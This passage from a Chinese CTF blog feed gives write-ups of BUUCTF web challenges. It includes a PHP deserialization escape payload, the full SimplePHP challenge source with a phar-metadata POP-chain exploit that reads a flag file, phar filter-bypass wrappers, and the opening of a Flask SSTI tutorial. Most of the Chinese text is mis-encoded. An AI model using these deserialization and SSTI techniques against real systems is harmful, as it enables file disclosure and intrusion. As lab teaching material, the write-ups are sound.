&#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;      return mysql_query($sql);   &#125;   public function filter($string) &#123;      $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);      $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;      $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);      $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;      return preg_replace($safe, &#39;hacker&#39;, $string);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;session_start();$user &#x3D; new user();$user-&gt;connect($config);</code></pre><p>update.php</p><pre class="language-none"><code class="language-none">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;      $username &#x3D; $_SESSION[&#39;username&#39;];      if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))         die(&#39;Invalid phone&#39;);      if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))         die(&#39;Invalid email&#39;);            if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)         die(&#39;Invalid nickname&#39;);      $file &#x3D; $_FILES[&#39;photo&#39;];      if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)         die(&#39;Photo size error&#39;);      move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));      $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];      $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];      $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];      $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);      $user-&gt;update_profile($username, serialize($profile));      echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;   &#125;   else &#123;?&gt;</code></pre><p>config.php</p><pre class="language-none"><code class="language-none">&lt;?php   $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;   $config[&#39;username&#39;] &#x3D; &#39;root&#39;;   $config[&#39;password&#39;] &#x3D; &#39;&#39;;   $config[&#39;database&#39;] &#x3D; &#39;&#39;;   $flag &#x3D; &#39;&#39;;?&gt;</code></pre><p>profileé‡Œæœ‰ä¸ªfile_get_contentå‡½æ•°å¯èƒ½æœ‰æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè€Œflagåœ¨config.phpä¸­ï¼Œå°±è¦è®©photo=config.phpï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å‰è¾¹çš„$profile = unserialize($profile);</p><p>æ‰€ä»¥å†æ ¹æ®</p><pre class="language-none"><code class="language-none">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);     $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;     return preg_replace($safe, &#39;hacker&#39;, $string);  &#125;</code></pre><p>å¯ä»¥è¿›è¡Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903162948758.png" alt="image-20210903162948758"></p><pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>è¿™é‡Œè¿™ä¸ªè¿‡æ»¤å¯ä»¥åˆ©ç”¨æŠ“åŒ…å°†nickenameæ”¹æˆæ•°ç»„ç±»å‹æ¥ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163055572.png" alt="image-20210903163055572"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220516175618670.png" alt="image-20220516175618670"></p><p>çœ‹ä¸€ä¸‹è¿™ä¸ªyour profileé¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163211494.png" alt="image-20210903163211494"></p><p>çœ‹ä¸€ä¸‹è¿™ä¸ªå›¾ç‰‡çš„æºç ï¼Œæ˜¯ä¸ªbase64åŠ å¯†çš„å†…å®¹ï¼Œè¿›è¡Œè§£å¯†åå¯ä»¥å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163313640.png" alt="image-20210903163313640"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163322131.png" alt="image-20210903163322131"></p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯è¿™ä¸ªflieå‚æ•°æ„Ÿè§‰å¯ä»¥ç›´æ¥æ–‡ä»¶è¯»å–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125203202419.png" alt="image-20211125203202419"></p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre class="language-none"><code class="language-none">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;&#x2F;title&gt;     &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt;     &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;         &lt;div class&#x3D;&quot;container-fluid&quot;&gt;         &lt;div class&#x3D;&quot;navbar-header&quot;&gt;             &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;é¦–é¡µ&lt;&#x2F;a&gt;         &lt;&#x2F;div&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;         &lt;&#x2F;div&gt;     &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre class="language-none"><code class="language-none">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123;     $show-&gt;source &#x3D; $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>upload_file.php</p><pre class="language-none"><code class="language-none">&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt;         &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;     &lt;label for&#x3D;&quot;file&quot;&gt;æ–‡ä»¶å:&lt;&#x2F;label&gt;     &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;     &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename);     echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension &#x3D; end($temp);     if(empty($extension)) &#123;         &#x2F;&#x2F;echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str &#x3D; $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test &#x3D; $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key &#x3D; $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params &#x3D; array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value &#x3D; $this-&gt;params[$key];        &#125; else &#123;            $value &#x3D; &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text &#x3D; base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125204709437.png" alt="image-20211125204709437"></p><p>è‚¯å®šæ˜¯ç”¨è¿™ä¸ªå‡½æ•°æ¥è¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ååºåˆ—åŒ–çš„åœ°æ–¹</p><p>åŠ ä¸ªæ–°çŸ¥è¯†</p><p><strong>åˆ©ç”¨pharåè®®å®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»</strong></p><p><strong>æ¼æ´æˆå› </strong> </p><p>pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼›è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°(file_exists()ã€is_dir()ç­‰)å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p>åŸç†åˆ†æ </p><p>pharçš„ç»„æˆ</p><p>é€šè¿‡æŸ¥é˜…æ‰‹å†Œå‘ç°pharç”±å››éƒ¨åˆ†ç»„æˆï¼›ç¿»é˜…æ‰‹å†Œå¯ä»¥çŸ¥é“ï¼Œpharç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯<code>stubã€manifest describing the contentsã€ the file contentsã€ [optional] a signature for verifying Phar integrity (phar file format only)</code> ä¸‹é¢è¿›è¡Œè§£é‡Šä¸€ä¸‹ï¼›</p><p>1 .0  a stub</p><p>æ ‡è¯†ä½œç”¨ï¼Œæ ¼å¼ä¸º</p><pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre><p>ï¼Œå‰é¢ä»»æ„ï¼Œä½†æ˜¯ä¸€å®šè¦ä»¥__HALT_COMPILER();?&gt;ç»“å°¾ï¼Œå¦åˆ™phpæ— æ³•è¯†åˆ«è¿™æ˜¯ä¸€ä¸ªpharæ–‡ä»¶ï¼›</p><p>2 .0 </p><p>a manifest describing the contents</p><p>å…¶å®å¯ä»¥ç†è§£ä¸ºpharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸­å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æœ‰å‹ç¼©ä¿¡æ¯å’Œæƒé™ï¼Œå½“ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„åºåˆ—åŒ–ä¹Ÿåœ¨é‡Œé¢ï¼›</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p><p>3 .0 the file contents</p><p>è¿™é‡ŒæŒ‡çš„æ˜¯è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›</p><p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p><p>ç­¾åï¼Œæ”¾åœ¨ç»“å°¾ï¼›</p><p><strong>C1e4rç±»ä¸­æœ‰__destruct(),</strong></p><p>__destruct()æ˜¯PHPä¸­çš„ææ„æ–¹æ³•ï¼Œåœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œç¨‹åºç»“æŸæ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡ã€‚</p><p>å‡½æ•°ä¸­å‘ç°äº†echoï¼Œé‚£ä¹ˆè¦åˆ©ç”¨echo $this-&gt;testã€‚</p><p><strong>showç±»æœ‰__toString(),</strong></p><p>__toStringæ–¹æ³•åœ¨å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ¯”å¦‚è¿›è¡Œechoï¼Œprintæ“ä½œæ—¶ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>åˆ©ç”¨$this-&gt;str[&#39;str&#39;]-&gt;source;</p><p><strong>Testç±»æœ‰__getï¼ˆï¼‰</strong></p><p>__getï¼ˆï¼‰å½“æœªå®šä¹‰çš„å±æ€§æˆ–æ²¡æœ‰æƒé™è®¿é—®çš„å±æ€§è¢«è®¿é—®æ—¶è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p><p>åˆ©ç”¨ $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</p><p>åˆ©ç”¨C1e4rç±»çš„<code>__destruct()</code>ä¸­çš„echo this-&gt;test<br>2.è§¦å‘Showç±»çš„<code>__toString()</code><br>3.åˆ©ç”¨Showç±»çš„<code>this-&gt;test2.è§¦å‘Showç±»çš„</code>__toString()<code>3.åˆ©ç”¨Showç±»çš„</code>content = $this-&gt;str[&#39;str&#39;]-&gt;source<code>4.è§¦å‘Testç±»çš„</code>__get()<code>5.æˆåŠŸåˆ©ç”¨</code>file_get()`è¯»æ–‡ä»¶</p><p>ååºåˆ—åŒ–ç»“æœ</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a &#x3D; new C1e4r();$b &#x3D; new Show();$c &#x3D; new Test();$a -&gt;str &#x3D; $b;$b -&gt;str[&#39;str&#39;] &#x3D; $c;$c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.pharæ–‡ä»¶$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;å›ºå®šçš„$phar-&gt;setMetadata($a); &#x2F;&#x2F;è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å$phar-&gt;stopBuffering();?&gt;</code></pre><p>ç”Ÿæˆpharæ–‡ä»¶åï¼Œæ”¹ä¸ªåç¼€ä¸Šä¼ å°±è¡Œï¼Œpharçš„æ–‡ä»¶ä¸ç®¡ä»€ä¹ˆåç¼€éƒ½ä¼šç›´æ¥æ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235333537.png" alt="image-20211125235333537"></p><p>çœ‹ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥æ ¹æ®æºç æ¨æ–‡ä»¶åï¼Œç„¶ååˆ©ç”¨phar://åè®®è®¿é—®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235401120.png" alt="image-20211125235401120"></p><p>å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235433599.png" alt="image-20211125235433599"></p><p>å°tipsï¼šå¦‚æœpharåè®®è¢«è¿‡æ»¤ï¼Œå¯ä»¥è¯•è¯•ç”¨</p><pre class="language-txt" data-language="txt"><code class="language-txt">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;    ç‰ˆæœ¬ï¼š7.4 +compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;    ç‰ˆæœ¬ï¼šéƒ½å¯ä»¥php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</code></pre><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> webå­¦ä¹  </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sstiæ¨¡æ¿æ³¨å…¥</title>
      <link href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p> ä¸ä¼špythonçœ‹çš„æˆ‘å¥½æ‡µï¼Œä¸€äº›ç±»ã€å¯¹è±¡å’Œé­”æœ¯å˜é‡çš„éƒ¨åˆ†éƒ½ä¸æ˜¯å¤ªæ‡‚ã€‚ã€‚ã€‚ã€‚</p> <span id="more"></span><h2 id="sstiæ¦‚è¿°"><a href="#sstiæ¦‚è¿°" class="headerlink" title="sstiæ¦‚è¿°"></a>sstiæ¦‚è¿°</h2><p>è´´ä¸ªå¤§ä½¬çš„æ–‡ç« </p><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">æµ…æSSTI(pythonæ²™ç›’ç»•è¿‡)_ç™½å¸½å­æŠ€æœ¯/æ€è·¯_iæ˜¥ç§‹ç¤¾åŒº-åˆ†äº«ä½ çš„æŠ€æœ¯ï¼Œä¸ºå®‰å…¨åŠ ç‚¹æ¸©åº¦. (ichunqiu.com)</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥) - MustaphaMond - åšå®¢å›­ (cnblogs.com)</a></p><p>[å…³äºpythoné­”æœ¯æ–¹æ³•payloadï¼šâ€œâ€œ.<strong>class</strong>.<strong>mro</strong><a href="https://blog.csdn.net/xiao__1bai/article/details/115672392">2].<strong>subclasses</strong>()<a href="%E2%80%9C/etc/passwd%E2%80%9C">40</a>.read() çš„è§£é‡Š_xiao__1baiçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">æ¨¡æ¿æ³¨å…¥æ€»ç»“_Herbert_555çš„åšå®¢-CSDNåšå®¢</a></p><p>SSTI(Server-Side Template Injection);å³æ¨¡æ¿æ³¨å…¥ï¼Œä¸æˆ‘ä»¬ç†ŸçŸ¥çš„SQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ç­‰åŸç†å¤§åŒå°å¼‚ã€‚æ³¨å…¥çš„åŸç†å¯ä»¥è¿™æ ·æè¿°ï¼šå½“ç”¨æˆ·çš„è¾“å…¥æ•°æ®æ²¡æœ‰è¢«åˆç†çš„å¤„ç†æ§åˆ¶æ—¶ï¼Œå°±æœ‰å¯èƒ½æ•°æ®æ’å…¥äº†ç¨‹åºæ®µä¸­å˜æˆäº†ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘ï¼›<br>æ¼æ´æˆå› åœ¨äºï¼šrender_templateå‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ä½¿ç”¨äº†%sæ¥åŠ¨æ€çš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çŸ¥é“Flask ä¸­ä½¿ç”¨äº†Jinja2 ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ{ { } }åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{ { } }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{ {1+1} }ä¼šè¢«è§£ææˆ2ã€‚</p><p>flask SSTIçš„åŸºæœ¬æ€è·¯å°±æ˜¯åˆ©ç”¨pythonä¸­çš„é­”æœ¯æ–¹æ³•æ‰¾åˆ°è‡ªå·±è¦ç”¨çš„å‡½æ•°</p><pre class="language-python" data-language="python"><code class="language-python">__dict__ ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__bases__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»&#x2F;&#x2F; __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__  å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ ä¸ func_globals ç­‰ä»·</code></pre><p><strong>flaskåŸºæœ¬çŸ¥è¯†</strong></p><p>flaské‡‡ç”¨è£…é¥°å™¨æ¥æŒ‡å®šè·¯ç”±ï¼Œé»˜è®¤çš„æ¨¡æ¿æ¸²æŸ“å¼•æ“ä¸º<strong>Jinja2</strong>ã€‚å…¶ä¸­æ¨¡æ¿çš„ä¸‰ç§ä¸»è¦è¯­æ³•ä¸º</p><ul><li>ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ï¼Œå¯ä»¥ä¼ å…¥å˜é‡åå’Œå˜é‡å€¼æ¨¡æ¿ä¼šè‡ªåŠ¨æ›¿æ¢å˜é‡ä¸ºä¼ å…¥çš„å˜é‡å€¼</li><li>{ % â€¦ % 